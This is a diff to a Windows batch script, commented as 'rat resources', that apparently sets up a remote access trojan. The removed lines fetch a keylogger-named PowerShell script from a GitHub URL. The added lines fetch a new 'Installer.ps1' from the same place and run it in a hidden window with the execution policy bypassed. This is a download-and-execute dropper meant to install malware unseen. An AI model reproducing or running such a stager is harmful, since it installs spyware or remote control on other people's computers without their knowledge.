@@ -32,7 +32,7 @@ REM you can remove the 'powershell' to get an admin CMD
 start powershell
 
 REM rat resources
-REM powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/KutilKuda/labs/refs/heads/main/Email-KLv2.ps1' -OutFile 'POC.zip'"
-powershell -windowstyle hidden "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/KutilKuda/labs/refs/heads/main/Email-KLv2.ps1' -OutFile 'install.ps1'"
-powershell Start-Process -windowstyle hidden -ep bypass "installer.ps1"
-powershell powershell.exe "$env:temp/p.ps1"
+
+powershell -windowstyle hidden "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/KutilKuda/labs/refs/heads/main/Installer.ps1' -OutFile 'install.ps1'"
+powershell Start-Process -windowstyle hidden -ep bypass "Installer.ps1"
+
